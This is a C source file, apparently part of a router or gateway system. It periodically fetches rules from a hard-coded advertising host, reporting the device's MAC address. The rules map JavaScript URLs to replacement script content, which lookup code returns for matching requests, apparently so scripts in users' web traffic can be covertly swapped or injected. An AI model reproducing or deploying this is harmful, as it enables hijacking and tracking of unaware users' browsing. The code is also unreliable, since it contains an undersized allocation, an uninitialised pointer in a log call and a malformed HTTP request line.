/*****************************************************
 *
 * 策略操作函数
 *
 *****************************************************/
#include "header.h"

#define RUSE_SERVER_HOST	"ad.yuanzhenginfo.com"
#define RUSE_SERVER_PORT	80
#define GET_STATUS			"/get_status"
#define GET_RUSE_LIST_URL	"/get_ruse_list"

// 策略节点
struct ruse_node{
	struct list_head node;
	char* url;
	unsigned int url_len;
	char* js;
};

// 策略节点字节长度
static unsigned int ruse_list_size = sizeof(struct ruse_node);

LIST_HEAD(ruse_list_head);					// 策略链表
static int ruse_list_count = 0;				// 策略链表计数器
//static pthread_mutex_t ruse_list_lock;

static unsigned int interval_time = 300;	// 获取状态间隔时间
static time_t local_last_time = 0;			// 策略库最后更新时间

static char device_sn[64] = {0};			// 设备序号
static unsigned int device_sn_size = 0;		// 设备序号长度

// 策略添加函数
void ruse_list_add(char* url, char* js)
{
	// 申请节点空间
	struct ruse_node *node = malloc(ruse_list_size);

	// 去掉头部
	if( !strncmp(url, "http://", 7) ){
		url += 7;
	}

	// 申请字符串空间 url
	node->url = malloc(strlen(url) + 1);
	memcpy(node->url, url, strlen(url) + 1);

	// 字符串长度
	node->url_len = strlen(url);

	// TODO 这个申请空间的方法是会有问题的
	node->js = malloc(strlen(js) + device_sn_size);
	strcpy(node->js, js);
	str_replace(node->js, "<%deviceNO%>", device_sn);

	// 添加到链表中
	list_add(&(node->node), &ruse_list_head);
	
	// 计数 并打印内容
	ruse_list_count ++;
	xyprintf(0, "RUSE_LIST - ADD : ruse_list_count = %d\nurl_len: %u\nurl: %s\njs:\n%s",
			ruse_list_count, node->url_len, node->url, node->js);
	//xyprintf(0, "RUSE_LIST - ADD : ruse_list_count = %d\n\t\t\t\t%s",
	//		ruse_list_count, node->url);
}

/** 
 *@brief 清空链表
 *@return js
 */
void ruse_list_clean()
{
	struct list_head* pos;
	struct ruse_node* node;

	// 逐条删除
	pos = ruse_list_head.next;
	while( pos != &ruse_list_head ){
		
		// 删除
		list_del( pos );
		ruse_list_count--;
		xyprintf(0, "RUSE_LIST - DEL : ruse_list_count = %d\n\t\t\t\t%s",
				ruse_list_count, node->url);
	
		// 释放内存
		node = (struct ruse_node*)pos;
		
		free( node->js );
		free( node->url );
		free( node );

		pos = ruse_list_head.next;
	}
}

/** 
 *@brief 查找数据
 *@return js
 */
char* ruse_list_find(char* url)
{
	// 
	struct list_head* pos;
	struct ruse_node* node;

	// 开始查找
//	pthread_mutex_lock(&ruse_list_lock);
	for( pos = ruse_list_head.next; pos != &ruse_list_head; pos = pos->next ){
		node = (struct ruse_node*)pos;
		
		// 判断是不是 是的话直接返回内容
		if( !strncmp(url, node->url, node->url_len) ){
			xyprintf(0, "Find - url: %s\n\t\t\t\t   %s", node->url, url);
			//	pthread_mutex_unlock(&ruse_list_lock);
			return node->js;
		}
	}
//	pthread_mutex_unlock(&ruse_list_lock);
	
	return NULL;
}

// 连接服务器
int conn_ruse_server()
{
	xyprintf(0, "Connect to %s:%d ......", RUSE_SERVER_HOST, RUSE_SERVER_PORT);
	int sockfd;
    struct sockaddr_in addr;
	
	// socket初始化
	if(( sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
		xyprintf(errno, "ERROR:%s %d -- socket()", __FILE__, __LINE__);
		return -1;
	}

	// 域名解析
	struct hostent* hostent = gethostbyname( RUSE_SERVER_HOST );
	if(!hostent){
		xyprintf(errno, "ERROR:%s %d -- gethostbyname()", __FILE__, __LINE__);
		return -1;
	}
	addr.sin_addr.s_addr	= *(unsigned long *)hostent->h_addr;

	xyprintf(0, "GET %s host %s success!", RUSE_SERVER_HOST, inet_ntoa(addr.sin_addr));

	// 连接 失败的话 休眠3秒 重新连接
	addr.sin_family			= AF_INET;
	addr.sin_port			= htons( RUSE_SERVER_PORT );
	if( connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == -1){
		xyprintf(errno, "ERROR:%s %d -- connect()", __FILE__, __LINE__);
		close(sockfd);
		return -1;
	}

	xyprintf(0, "Connect to %s:%d success!", RUSE_SERVER_HOST, RUSE_SERVER_PORT);

	return sockfd;
}


/** 
 *@brief  发送数据函数
 *@param  sock		类型 int			要发送到的socket套接字
 *@param  buf		类型 unsigned char*	要发送的内容
 *@param  len		类型 int			要发送的内容长度
 *@return success 0 failed -1
 */
int send_block(int sock, unsigned char *buf, int len)
{
	int ret;			//返回值
	int slen = len;		//未发送字节数
	int yelen = 0;		//已发送字节数
	struct timeval tv;	//超时时间结构体

	//错误判断
	if (sock == -1 || !buf || len <= 0){
		xyprintf(errno, "SOCK_ERROR:%s %s %d -- I can't believe, why here !!! （╯' - ')╯︵ ┻━┻ ", __func__, __FILE__, __LINE__);
		return -1;
	}

	//设置超时时间
	tv.tv_sec = 1;
	tv.tv_usec = 0;
	setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

	//开启发送
	while (slen > 0) {
		
		//发送 -- send -- ┬─┬ ノ( ' - 'ノ)
		ret = send(sock, buf + yelen, slen, 0);		
		
		if (ret < 0) {			// 发送错误
			xyprintf(errno, "SOCK_ERROR:%s %s %d -- send() failed!", __func__, __FILE__, __LINE__);
			if (errno == EAGAIN) {
				continue;
			}
			return -1;
	    }
		else if (ret == 0) {	// 对方关闭了套接字
			xyprintf(errno, "SOCK_ERROR:%s %s %d -- send() failed!", __func__, __FILE__, __LINE__);
			return -1;
		}
		else {					// 成功
			yelen += ret;	//已发送
			slen -= ret;	//未发送
		}

	}
	return 0;
}

/** 
 *@brief  接收数据函数
 *@param  sock		类型 int			要接收数据的socket套接字
 *@param  buf		类型 unsigned char*	要接收的内容
 *@param  len		类型 int			要接收的内容长度
 *@param  block_flag类型 int			1 使用阻塞接收, 0 使用非阻塞接收
 *@return success 0 failed -1
 */
int recv_block(int sock, unsigned char *buf, int len/*, int block_flag*/)
{
	int ret;			// 返回值
	int rlen = 0;		// 已接收到的字节数
	struct timeval tv;	// 超时时间结构体

	//错误判断
	if (sock == -1 || !buf || len <= 0){
		xyprintf(errno, "SOCK_ERROR:%s %s %d -- I can't believe, why here !!! （╯' - ')╯︵ ┻━┻ ", __func__, __FILE__, __LINE__);
		return -1;
	}

	//设置超时时间
	tv.tv_sec = 1;
	tv.tv_usec = 0;
	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

	//开始接收
	while (rlen < len) {
		//接收
		ret =  recv(sock, buf + rlen, len - rlen, 0);
		if (ret < 0 ) {				// 读取错误
			xyprintf(errno, "SOCK_ERROR:%s %s %d -- recv() failed!", __func__, __FILE__, __LINE__);
//			if (errno == EAGAIN) {
//				continue;
//			}
			return -1;
		}
		else if (ret == 0) {		// 对方关闭了套接字
			xyprintf(errno, "SOCK_ERROR:%s %s %d -- recv() failed!", __func__, __FILE__, __LINE__);
			return -1;
		}
		else {						// 读取正常
			rlen += ret;
		}
	}
	return 0;
}

// 获取http请求的回复
char* get_http_res(char* ques)
{
	// 初始化socket
	int sockfd = conn_ruse_server();
	if( sockfd < 0 ){
		return NULL;
	}

	xyprintf(0, "Send request ......\n%s", ques);
	// 发送请求
	if( send_block(sockfd, ques, strlen(ques)) ){
		xyprintf(errno, "SOCK_ERROR:%s %s %d -- send get ruse num failed!", __func__, __FILE__, __LINE__);
		goto SOCKETED_ERROR;
	}
	
	xyprintf(0, "Recv reply ......");

	// 接收回复
	char res[1024] = {0};
	
	// 先最多接收1024个字符
	int ret = recv(sockfd, res, 1024, 0);
	if( ret < 0 ){
		xyprintf(errno, "SOCK_ERROR:%s %s %d -- send get ruse num failed!", __func__, __FILE__, __LINE__);
		goto SOCKETED_ERROR;
	}
	
	//xyprintf(0, "%s", res);

	// 查找http头中的内容长度项位置
	char *res_content_length = strstr(res, "Content-Length: ");
	if(!res_content_length){
		xyprintf(errno, "ERROR:%s %s %d -- get Content-Length error!", __func__, __FILE__, __LINE__);
		xyprintf(0, "res:\n%s\n", res);
		xyprintf(0, "ques:%s\n", ques);
		goto SOCKETED_ERROR;
	}

	res_content_length += strlen("Content-Length: ");
	// 后面的空格
	if(*res_content_length == ' '){
		res_content_length++;
	}

	// 获取长度
	int content_length = atoi(res_content_length);

	// 如果长度错误
	if( !content_length ){
		xyprintf(errno, "Get Content-Length error at file %s line %d!", __FILE__, __LINE__);
		xyprintf(0, "ret = %d - res - %s", ret, res);
		xyprintf(0, "ques:%s", ques);
		goto SOCKETED_ERROR;
	}
	
	// 找到http头的结尾，也就是内容区的开始
	char *res_content = strstr(res, "\r\n\r\n");
	res_content += 4;

	// 计算已经接收到的数据长度
	int content_recved_num = ret - (res_content  - res);
	// 没有接收到的数据长度
	int content_recv_num = content_length - content_recved_num;
	
	char *content = malloc(content_length + 32);
	memset(content, 0, content_length + 32);

	// 拷贝已接收到的内容数据
	if( content_recved_num > 0 ){
		memcpy(content, res_content, content_recved_num);
	}
	else if( content_recved_num < 0 ) {
		xyprintf(0, "??? Is this a error url, content_recved_num is %d!", content_recved_num);
		goto MALLOCED_ERROR;
	}

	// 如果还有数据需要接收
	if( content_recv_num > 0 ){
		// 继续接收剩余的数据
		if( recv_block(sockfd, content + content_recved_num, content_recv_num) ){
			xyprintf(0, "Recv the content error, file at %s, line is %d", __FILE__, __LINE__);
			goto MALLOCED_ERROR;
		}
	}

	xyprintf(0, "Recv reply complete, close socket!\n");

	close(sockfd);
	return content;

MALLOCED_ERROR:
	if(content){
		free(content);
	}
SOCKETED_ERROR:
	close(sockfd);
	return NULL;
}


// 处理get status 请求回复
int pro_status_res(char* res, unsigned int* ruse_num, time_t* server_last_time)
{
	// 主体json
	cJSON *json = cJSON_Parse( res );
	if (!json){
		xyprintf(0, "JSON's data error -- %s -- %d!!!", __FILE__, __LINE__);
		return -1;
	}

	// 间隔时间
	cJSON *interval_time_json = cJSON_GetObjectItem(json, "Interval_time");
	if(!interval_time_json){
		xyprintf(0,"JSON's data error -- %s -- %d!!!", __FILE__, __LINE__);
		goto JSON_ERROR;
	}

	// 策略库数量
	cJSON *ruse_num_json = cJSON_GetObjectItem(json, "strategynum");
	if(!ruse_num_json){
		xyprintf(0,"JSON's data error -- %s -- %d!!!", __FILE__, __LINE__);
		goto JSON_ERROR;
	}
	
	// 策略库的最后更新时间
	cJSON *server_last_time_json = cJSON_GetObjectItem(json, "lasttime");
	if(!server_last_time_json){
		xyprintf(0,"JSON's data error -- %s -- %d!!!", __FILE__, __LINE__);
		goto JSON_ERROR;
	}

	// 获取间隔时间
	if( interval_time_json->valueint > 3600 || interval_time_json->valueint < 60 ){
		interval_time = 300;
	}
	else {
		interval_time = interval_time_json->valueint;
	}

	// 获取策略库数量
	if( ruse_num_json->valueint > 0 ){
		*ruse_num = ruse_num_json->valueint;
	}

	// 获取服务器的最后更新时间
	*server_last_time = (time_t)atol(server_last_time_json->valuestring);

	cJSON_Delete(json);
	return 0;

JSON_ERROR:
	cJSON_Delete(json);
	return -1;
}

// 处理ruse list请求回复
int pro_ruse_list_res(char* res, unsigned int num)
{
	// 主体json
	cJSON *json = cJSON_Parse( res );
	if (!json){
		xyprintf(0, "JSON's data error -- %s -- %d!!!", __FILE__, __LINE__);
		return -1;
	}

	// 获取数组数量
	int array_num = cJSON_GetArraySize(json);
	if( array_num != num ){
		xyprintf(0, "Json data error, ques num is %d, get num is %d!", num, array_num);
		goto JSON_ERROR;
	}

	// 清空原链表中的内容
	ruse_list_clean();

	// 循环读取数组中的数据
	cJSON* item = NULL, *js_url = NULL, *replace_con = NULL;
	int i = 0;

	for(; i < array_num; i++){
		item = cJSON_GetArrayItem(json, i);
		if(!item){
			xyprintf(0,"JSON's data error -- %s -- %d!", __FILE__, __LINE__);
			goto JSON_ERROR;
		}

		// js_url
		js_url = cJSON_GetObjectItem(item,"js_url");
		if (!js_url){
			xyprintf(0,"JSON's data error -- %s -- %d!", __FILE__, __LINE__);
			goto JSON_ERROR;
		}
		
		// js 替换成的内容
		replace_con = cJSON_GetObjectItem(item,"replace_con");
		if (!replace_con){
			xyprintf(0,"JSON's data error -- %s -- %d!", __FILE__, __LINE__);
			goto JSON_ERROR;
		}

		if( js_url->valuestring && replace_con->valuestring ){
			ruse_list_add(js_url->valuestring, replace_con->valuestring);
		}
		else {
			xyprintf(0, "Wrining: A empty url or replace_con!");
		}
	}

	cJSON_Delete(json);
	return 0;

JSON_ERROR:
	cJSON_Delete(json);
	return -1;
}


// 策略库更新线程
void* ruse_thread(void *fd)
{
	pthread_detach(pthread_self());

	xyprintf(0, "Ruse thread initing ......");

	// 设备序号
	snprintf(device_sn, sizeof(device_sn) - 1, "%02x:%02x:%02x:%02x:%02x:%02x",
			reinjec_mac[0], reinjec_mac[1], reinjec_mac[2],
			reinjec_mac[3], reinjec_mac[4], reinjec_mac[5]);

	device_sn_size = strlen(device_sn);

	xyprintf(0, "device sn is %s, size is %u", device_sn, device_sn_size);
	
	xyprintf(0, "Ruse thread running ......\n");

	while(1){
		// 组成获取状态请求字符串
		char ques[1024] = {0};
		snprintf(ques, sizeof(ques) - 1, "GET %s?mac=%s HTTP1.1\r\nHost: %s\r\n\r\n",
				GET_STATUS, device_sn, RUSE_SERVER_HOST);

		xyprintf(0, "Get status ......");
		// 发送请求并获取内容
		char* res = get_http_res(ques);
		if(!res){
			xyprintf(0, "ERROR : get status error!");
			sleep(interval_time);
			continue;
		}

		unsigned int ruse_num = 0;
		time_t server_last_time;
		// 解析status回复内容
		if( pro_status_res(res, &ruse_num, &server_last_time) ){
			xyprintf(0, "ERROR : status content error!");
			sleep(interval_time);
			continue;
		}

		xyprintf(0, "Get status success, interval time is %u, ruse num is %u, server last time is %u\n",
					interval_time, ruse_num, server_last_time);

		// 处理完获取的http内容后 记得释放内存
		free(res);
		res = NULL;

		// 是否需要更新策略库
		if(local_last_time != server_last_time){
			
			xyprintf(0, "Get ruse ......");

			snprintf(ques, sizeof(ques) - 1, "GET %s?begin=0&num=%u HTTP1.1\r\nHost: %s\r\n\r\n",
					GET_RUSE_LIST_URL, ruse_num, RUSE_SERVER_HOST);
		
			// 获取到回复
			res = get_http_res(ques);
			if(!res){
				xyprintf(0, "get ruse list error!");
				sleep(interval_time);
				continue;
			}

			// 处理数据
			if( pro_ruse_list_res(res, ruse_num) ){
				xyprintf(0, "Pro ruse list json error!");
				free(res);
				sleep(interval_time);
				continue;
			}
	
			// 处理完获取的http内容后 记得释放内存
			free(res);
			res = NULL;
		
			// 更新结束 修改本地时间
			local_last_time = server_last_time;
			
			xyprintf(0,"Get ruse succcess!\n");
		}// end if
		
		// 间隔时间
		sleep(interval_time);
	}// end while(1)
	pthread_exit(NULL);
}
